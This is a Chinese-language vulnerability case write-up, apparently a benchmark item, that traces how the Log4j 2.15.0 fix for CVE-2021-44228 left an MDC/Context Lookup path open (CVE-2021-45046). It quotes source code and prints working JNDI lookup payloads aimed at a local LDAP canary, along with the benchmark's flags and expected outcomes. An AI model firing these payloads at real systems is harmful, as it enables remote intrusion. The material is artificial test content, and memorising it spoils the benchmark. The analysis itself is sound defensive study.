# Log4j 2：关掉了日志正文里的 `${}`，MDC / Context Lookup 仍会递进 JNDI

- Case：`PCBV2-0077`
- 产品：Apache Log4j 2（本 case 跑 Maven Central 的 `log4j-core` 2.14.1 / 2.15.0 / 2.16.0，经普通 `Logger` + `ThreadContext` API）
- 链：CVE-2021-44228（2.14.1 → 2.15.0）→ CVE-2021-45046（2.15.0 → 2.16.0）
- 源码对着 GitHub tag `rel/2.15.0` / `rel/2.16.0` 的 `MessagePatternConverter`、`JndiManager`、`JndiLookup`。运行时是未改过的官方 jar。共享 `log4j2.xml` 的 PatternLayout 含 `$${ctx:pcbctx}`——正是 advisory 点名的非默认布局。

2021 年 12 月 6 日，2.15.0 默认关掉消息正文里的 lookup，并给 JNDI 加上协议 / 主机允许清单。四天后 Apache 声明：*the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations*。攻击者若能控制 Thread Context Map（MDC），且布局使用 Context Lookup（例如 `$${ctx:loginId}`）或 `%X` / `%mdc`，仍可把 `${jndi:...}` 打进 `JndiLookup`。NVD CVE-2021-45046 写明 2.16.0 *removing support for message lookup patterns and disabling JNDI functionality by default*。

根因不只是「允许清单忘了收紧」。检查插在「`%m` 要不要扫描 `${}`」这一层；真正发起 LDAP 连接的是 `JndiManager.lookup` → `context.lookup`。布局里的 `$${ctx:...}` 仍会取出 MDC 再递归插值。下面按一次日志走进去。

---

## 这块功能本来在干什么

Log4j 的 PatternLayout 把事件格式化成一行。`%m` 是消息正文；`$${ctx:key}` 是「布局里写死的 Context Lookup」：先把 `$$` 收成 `$`，运行时再取 Thread Context。许多应用把用户名、请求 ID 放进 MDC，再在模式里打印。

一次典型调用（本 case 的 Driver）：

```java
ThreadContext.put("pcbctx", attackerControlled);
logger.info("user request received");
```

对应配置（三个版本共用、未改）：

```xml
<PatternLayout pattern="%d %p %c{1.} [%t] $${ctx:pcbctx} %m%n"/>
```

数据流（2.15.0，本 case 的 V1）：

```text
Logger.info(message)  +  可选 ThreadContext.put(key, value)
    → PatternLayout 格式化
         %m  → MessagePatternConverter
              V1：loadLookups() 默认 false
                  没有 %m{lookups} 就不扫消息正文里的 ${}
         $${ctx:pcbctx}
              先变成 ${ctx:pcbctx}
              Interpolator 取 MDC["pcbctx"]
              2.15.0 对取回的字符串再插值
              若值是 ${jndi:ldap://127.0.0.1:1389/token}
                  → JndiLookup.lookup
                  → JndiManager.lookup
                       协议 ldap 在默认允许清单里
                       主机 127.0.0.1 在 NetUtils.getLocalIps() 里
                       context.lookup(ldap://...)     ← 真正的网络连接
    → 本 case 的 LDAP 金丝雀在 127.0.0.1:1389 记下 token，回显 PCBFLAG
```

设计意图：布局可以引用 MDC 方便排障；**攻击者控制的字符串不应当触发 JNDI**。成功穿越之后的效果是：进程对 `127.0.0.1:1389` 发出真实 LDAP 查询，金丝雀才能把 flag 写进 hits 日志。本 case 的 LDAP 监听器只完成绑定、记下 DN、返回空结果——没有 Reference、没有远程类加载。观察到 flag 当且仅当 lookup 真的连上了。

---

## 原始漏洞：消息正文默认插值（CVE-2021-44228，2.14.1）

2.14.1 的 `%m` 只要正文含 `${` 就会 `StrSubstitutor.replaceIn`。一条

```text
logger.info("${jndi:ldap://127.0.0.1:1389/<token>}")
```

会进 `JndiLookup`，当时的 `JndiManager.lookup` 没有任何协议 / 主机限制，直接 `context.lookup(name)`。这是 Log4Shell。本 case seed：

```text
vector = message
payload = ${jndi:ldap://127.0.0.1:1389/<token>}
```

V0 连接金丝雀，flag 出现在 Driver 输出。这是 v0 + `--seed`。

---

## 维护者改了什么（CVE-2021-44228 修复，2.15.0）

两处。第一，`MessagePatternConverter` 默认不再给 `%m` 套 lookup。tag `rel/2.15.0`：

```java
// log4j-core/.../pattern/MessagePatternConverter.java  (2.15.0 / V1)
    private static boolean loadLookups(final String[] options) {
        if (options != null) {
            for (final String option : options) {
                if (LOOKUPS.equalsIgnoreCase(option)) {
                    return true;
                }
            }
        }
        return false;
    }

    public static MessagePatternConverter newInstance(final Configuration config, final String[] options) {
        boolean lookups = loadLookups(options);
        ...
        if (lookups && config != null) {
            result = new LookupMessagePatternConverter(result, config);
        }
```

没有 `%m{lookups}` 时，`SimpleMessagePatternConverter` 只把消息文本抄进 buffer，不再 `replaceIn`。

第二，`JndiManager.lookup` 增加允许清单。默认协议 `java, ldap, ldaps`；默认主机是 `NetUtils.getLocalIps()`（含 localhost / 127.0.0.1 / 本机地址）：

```java
// log4j-core/.../net/JndiManager.java  (2.15.0)
    private static final List<String> permanentAllowedHosts = NetUtils.getLocalIps();
    private static final List<String> permanentAllowedProtocols = Arrays.asList(JAVA, LDAP, LDAPS);

    public synchronized <T> T lookup(final String name) throws NamingException {
        try {
            URI uri = new URI(name);
            if (uri.getScheme() != null) {
                if (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) {
                    LOGGER.warn("Log4j JNDI does not allow protocol {}", uri.getScheme());
                    return null;
                }
                if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) {
                    if (!allowedHosts.contains(uri.getHost())) {
                        LOGGER.warn("Attempt to access ldap server not in allowed list");
                        return null;
                    }
                    ...
                }
            }
        } catch (URISyntaxException ex) {
            LOGGER.warn("Invalid JNDI URI - {}", name);
            return null;
        }
        return (T) this.context.lookup(name);
    }
```

对 seed 这种明文写在 `%m` 里的 `${jndi:...}`，第一处就够用：正文不再插值，JNDI 根本不会被叫到。本 case 金丝雀在 127.0.0.1，**本来就在默认 allowed-hosts 里**，所以 v1 seed 被挡住靠的是消息 lookup 默认关闭，不是主机清单。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险形态长得像「日志消息正文里出现 `${jndi:...}`」。
2. 关掉 `%m` 插值、再限制 JNDI 协议和远程主机之后，lookup 就不会再被攻击者数据触发。

第二点不成立。PatternLayout 里其它转换器仍会插值；`$${ctx:key}` 取出的 MDC 值在 2.15.0 上会再扫一遍 `${}`。主机清单默认包含回环地址，所以「允许的 JNDI」仍会 `context.lookup`。

---

## 消毒之后，字符串怎么接到真正的 JNDI 连接上

`%m` 不再插值之后，同一条 `LogEvent` 仍要走完整 pattern。`$${ctx:pcbctx}` 不是消息转换器，它是 Context Lookup：取出 MDC 之后，2.15.0 的 substitutor **递归**处理结果。若 MDC 值是 `${jndi:ldap://127.0.0.1:1389/token}`，就进入：

```java
// log4j-core/.../lookup/JndiLookup.java  (2.15.0 与 2.16.0 的 lookup 方法本身几乎相同)
    public String lookup(final LogEvent event, final String key) {
        if (key == null) {
            return null;
        }
        final String jndiName = convertJndiName(key);
        try (final JndiManager jndiManager = JndiManager.getDefaultManager()) {
            return Objects.toString(jndiManager.lookup(jndiName), null);
        } catch (final NamingException e) {
            ...
        }
    }
```

然后是上面的 `JndiManager.lookup`：`ldap` 允许，`127.0.0.1` 允许，最后一行 `this.context.lookup(name)` 发出 LDAP。过滤器刚看过的是「消息正文要不要扫 `${}`」；网络连接看的是 **layout 其它位置** 是否仍把用户字符串送进同一个 `JndiLookup`。两套入口中间没有「MDC 值禁止再插值」的谓词。

金丝雀能记下 token，依据就是这次真实的 `context.lookup`，而不是日志文件里是否打印了 `${jndi:...}` 字样。

---

## 仓库里已经有 JNDI 允许清单，默认却包含本 case 的目标

同一份 `JndiManager.java` 里，`permanentAllowedHosts = NetUtils.getLocalIps()` 从构造时就并进 `allowedHosts`。CVE-2021-45046 的公开影响包含「对允许目标的信息泄露 / 部分环境 RCE / 所有环境的本地代码执行」。本 case 把金丝雀绑在 127.0.0.1，是为了忠实复现「2.15.0 仍会解析一个 allowed JNDI」，而不是去绕主机清单。

| 路径 | 2.15.0 还插值吗 | 再进 JndiLookup？ |
|---|---|---|
| `%m` 默认 | 否（除非 `{lookups}`） | 否 |
| `$${ctx:pcbctx}` | 是，且对 MDC 值递归 | 是 |
| `%X` / `%mdc` | advisory 点名，同类 | 是（本 case 未作为 residual 主向量） |
| `JndiManager` 主机清单 | 默认含 127.0.0.1 | 放行本 case 金丝雀 |

不是没有第二道门。是 **第二道门默认把回环算作合法 LDAP 服务器**，而第一道门只关了 `%m`。SANS ISC 当时也写：2.15.0 把 JNDI 限制到 localhost，但 Context Lookup 仍可能打出连接。

即便把金丝雀换到非本机地址，2.15.0 仍可能在部分配置下 DoS 或走别的 lookup；那不是本 case 的观察通道。

---

## 这个补丁挡住了什么、没挡住什么

- `MessagePatternConverter.loadLookups` 默认 false：挡住 seed 那种写在 `logger.info("${jndi:...}")` 里的向量
- `JndiManager` 允许清单：挡住非 ldap/java、以及非本机 LDAP（对本 case 的 127.0.0.1 **不挡**）
- Context Lookup / MDC：仍取出用户字符串并递归插值

变换：

```text
seed (消息):
  logger.info("${jndi:ldap://127.0.0.1:1389/tok}")
  V1 %m：不插值 → 无连接

residual (MDC):
  ThreadContext.put("pcbctx", "${jndi:ldap://127.0.0.1:1389/tok}")
  logger.info("user request received")
  pattern $${ctx:pcbctx} → ${ctx:pcbctx} → MDC 值
  2.15.0 再插值 → JndiLookup → 127.0.0.1 在名单内
  context.lookup → 金丝雀记录 token → 回显 FLAG
```

Apache 安全公告点名的例子就是 `$${ctx:loginId}`。本 case 只是把 key 换成 `pcbctx`。

---

## 残余仍然走同一条 JndiLookup → LDAP 路径（CVE-2021-45046）

没有换 sink、没有换协议、没有换金丝雀。还是 `${jndi:ldap://127.0.0.1:1389/<token>}`，只是从消息正文挪到 MDC：

```java
ThreadContext.put("pcbctx", "${jndi:ldap://127.0.0.1:1389/" + token + "}");
logger.info("user request received");
```

`MessagePatternConverter` 的默认关闭照样生效（这条消息正文没有 `${}`）；layout 上的 Context Lookup 把同一串送进 `JndiLookup`。本 case residual 写死 `mdc_key=pcbctx`，与 `log4j2.xml` 一致。认证意图：v1 + `--residual` 在 Driver 输出中观察到 `PCBFLAG_...`（lookup 确实 fired）。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：2.15.0 只关了 `%m`；非默认布局仍对 MDC 递归插值；默认 allowed-hosts 包含 127.0.0.1，于是「限制 JNDI」并不限制本 case 的金丝雀。seed 被挡住只说明「正文里的 `${jndi}` 不再插值」，不说明「任何 lookup 入口都不能再把用户字符串送进 `InitialDirContext`」。

先前建议的 `-Dlog4j2.formatMsgNoLookups=true` **不能**缓解 45046：它管的也是消息正文。advisory 写明这一点。

---

## 后来又补了什么（CVE-2021-45046，2.16.0）

2.16.0 做了两件更彻底的事：去掉消息 lookup 功能；**默认关闭整个 JNDI**。tag `rel/2.16.0` 的 `JndiManager`：

```java
// log4j-core/.../net/JndiManager.java  (2.16.0 / V2)
    public static boolean isJndiEnabled() {
        return PropertiesUtil.getProperties().getBooleanProperty("log4j2.enableJndi", false);
    }
```

`JndiManagerFactory.createManager`：若 `!isJndiEnabled()`，构造一个 `context == null` 的空 manager；`lookup` 开头直接 `if (context == null) return null`，不会 `InitialDirContext`。RELEASE-NOTES：*Disable JNDI by default. Require log4j2.enableJndi to be set to true*；*Completely remove support for Message Lookups*（LOG4J2-3208 / LOG4J2-3211）。

对残余输入：即便 layout 仍写出 `${ctx:pcbctx}` 的值，`JndiLookup` 拿到的 manager 没有 Context，LDAP 连接不发生。公开建议升到 2.16.0（Java 8）或 2.12.2（Java 7）。2.17.0 又把属性拆成 `log4j2.enableJndiLookup` 等，并把协议默认收到只剩 `java`。本 benchmark 的 v2 只关闭「MDC + Context Lookup + 默认允许的 ldap://127.0.0.1」这一条。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是 `%m` 要不要扫 `${}`，以及 JNDI 的远程主机。真正造成可观察连接的是 **layout 其它转换器仍把用户数据送进同一个 `JndiLookup`**。V2 才关掉 JNDI 本身。

**不是没有第二道门。**  
`allowedHosts` / `allowedProtocols` 在 2.15.0 就在，而且 lookup 末尾仍是 `context.lookup`。缺的是「默认拒绝 JNDI」和「MDC 结果不要再当 lookup 源」。从 V1 的 diff 只能看到 `loadLookups()→false`；要判断是否闭合，必须看到 `log4j2.xml` 里的 `$${ctx:...}` 以及 `permanentAllowedHosts`。

**同一 `${jndi:ldap://...}` 字节，只换了放进哪一个查找源。**  
消息、MDC、Thread Context 模式、甚至 `Logger.printf`，在 2.15.0 上只要还能插值，都进同一 sink。advisory 把 Context Lookup 和 `%X/%mdc` 并列。

**金丝雀必须是允许清单里的主机，才说明「45046 仍会解析 allowed JNDI」。**  
若把 LDAP 放到外网，2.15.0 的主机清单会挡住，那测到的就不是这条残差，而是清单本身。本 case 有意用 127.0.0.1。

---

## 版本、入口、参考

| | log4j-core | `%m` lookup | JNDI | 消息 `${jndi}` seed | MDC `$${ctx}` residual |
|---|---|---|---|---|---|
| V0 | 2.14.1 | 默认开 | 无限制 | LDAP 连接，flag | （不必） |
| V1 | 2.15.0 | 默认关 | 协议+本机允许 | 不插值，无连接 | 递归插值，127.0.0.1 允许，有连接 |
| V2 | 2.16.0 | 功能删除 | `log4j2.enableJndi` 默认 false | 挡 | manager 无 Context，无连接 |

- 入口：Driver stdin 投递 `{vector,token,payload,mdc_key}`；金丝雀 `127.0.0.1:1389`
- 认证意图：v0 seed fired+flag；v1 seed 不 fired；v1 residual fired+flag
- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)、[CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046)
- [SANS ISC：2.15.0 不够](https://isc.sans.edu/diary/28134)
- 源码：[`rel/2.15.0` MessagePatternConverter](https://github.com/apache/logging-log4j2/blob/rel/2.15.0/log4j-core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.java)、[JndiManager](https://github.com/apache/logging-log4j2/blob/rel/2.15.0/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java)；[`rel/2.16.0` JndiManager.isJndiEnabled](https://github.com/apache/logging-log4j2/blob/rel/2.16.0/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java)
